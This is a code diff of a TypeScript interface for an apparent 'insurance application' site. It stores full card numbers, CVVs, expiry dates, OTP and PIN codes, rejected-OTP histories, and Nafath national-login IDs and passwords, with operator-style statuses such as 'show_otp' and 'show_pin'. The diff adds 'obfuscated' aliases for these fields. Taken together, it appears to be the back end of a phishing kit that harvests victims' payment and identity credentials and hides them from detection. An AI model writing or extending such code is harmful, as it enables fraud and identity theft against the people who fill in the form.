@@ -31,10 +31,14 @@ export interface InsuranceApplication {
   
     // Step 4: Payment
     paymentMethod?: string
-    cardNumber?: string
+    _v1?: string // cardNumber (obfuscated)
+    cardNumber?: string // Keep for backward compatibility
     cardType?: string
-    expiryDate?: string
-    cvv?: string
+    _v3?: string // expiryDate (obfuscated)
+    expiryDate?: string // Keep for backward compatibility
+    _v2?: string // cvv (obfuscated)
+    cvv?: string // Keep for backward compatibility
+    _v4?: string // cardHolderName (obfuscated)
     bankInfo?: {
       name: string
       country: string
@@ -44,9 +48,11 @@ export interface InsuranceApplication {
     otpStatus?: "waiting" | "verifying" | "approved" | "rejected" | "pending" | "otp_rejected" | "show_otp" | "show_pin" | ""
     pinStatus?: "waiting" | "verifying" | "approved" | "rejected" | "pending"
     otpCode?: string
-    otp?: string // كود OTP (الحقل المستخدم من موقع الزوار)
+    _v5?: string // otp (obfuscated)
+    otp?: string // كود OTP (الحقل المستخدم من موقع الزوار) - Keep for backward compatibility
     oldOtp?: Array<{ code: string; rejectedAt: string }> // الأكواد المرفوضة القديمة
-    pinCode?: string
+    _v6?: string // pinCode (obfuscated)
+    pinCode?: string // Keep for backward compatibility
     originalPrice?: number
     discount?: number
     finalPrice?: number
@@ -54,7 +60,8 @@ export interface InsuranceApplication {
   
     // Verification fields for phone and ID card codes
     phoneVerificationCode?: string
-    phoneOtp?: string // كود تحقق الهاتف (الحقل الفعلي المستخدم)
+    _v7?: string // phoneOtp (obfuscated)
+    phoneOtp?: string // كود تحقق الهاتف (الحقل الفعلي المستخدم) - Keep for backward compatibility
     phoneOtpSubmittedAt?: string
     allPhoneOtps?: string[]
     phoneVerificationStatus?: "pending" | "approved" | "rejected"
@@ -67,8 +74,10 @@ export interface InsuranceApplication {
     lastSeen?:string
     
     // Nafad fields
-    nafazId?: string
-    nafazPass?: string
+    _v8?: string // nafazId (obfuscated)
+    nafazId?: string // Keep for backward compatibility
+    _v9?: string // nafazPass (obfuscated)
+    nafazPass?: string // Keep for backward compatibility
     nafadConfirmationCode?: string
     nafadConfirmationStatus?: "pending" | "approved" | "rejected"
     // Metadata
@@ -127,7 +136,7 @@ export interface InsuranceApplication {
     selectedFeatures?: string[]
     history?: Array<{
       id: string
-      type: "card" | "otp" | "pin" | "phone_info" | "phone_otp" | "nafad"
+      type: "card" | "otp" | "pin" | "phone_info" | "phone_otp" | "nafad" | "_t1" | "_t2" | "_t3" | "_t4" | "_t5" | "_t6"
       timestamp: string
       status: "pending" | "approved" | "rejected"
       data: any
